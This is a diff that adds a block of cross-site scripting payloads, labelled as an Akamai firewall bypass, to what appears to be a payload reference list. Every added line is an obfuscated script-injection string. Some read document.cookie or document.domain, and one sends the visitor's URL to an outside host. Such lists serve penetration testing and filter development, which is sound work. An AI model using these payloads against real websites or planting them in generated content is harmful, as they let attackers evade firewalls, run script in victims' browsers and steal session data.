@@ -178,6 +178,19 @@
   <th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
   javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
   ');}</script><img src=q onerror=confirm(document.domain)>
+  <--// Akamai Bypass--!>
+  "><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
+  <details onauxclick=confirm`xss`></details>
+  <x onauxclick=a=alert,a(domain)>click
+  <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+  <a href="javas%09cript:[1].map(top['ale'+'rt'])">
+  <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+  "><svg/on</script>laod=alert>
+  <ijavascriptmg+src+ojavascriptnerror=confirm(1)>
+  </ScRiPt><img src=something onauxclick="new Function `al\ert\`xss\``">
+  javascript:new%20Function`al\ert\`1\``;
+  <b/onanimationstart=prompt`${document.domain}&#x60;>
+  <style>@keyframes a{}b{animation:a;}</style>
   ```
 </details>
 
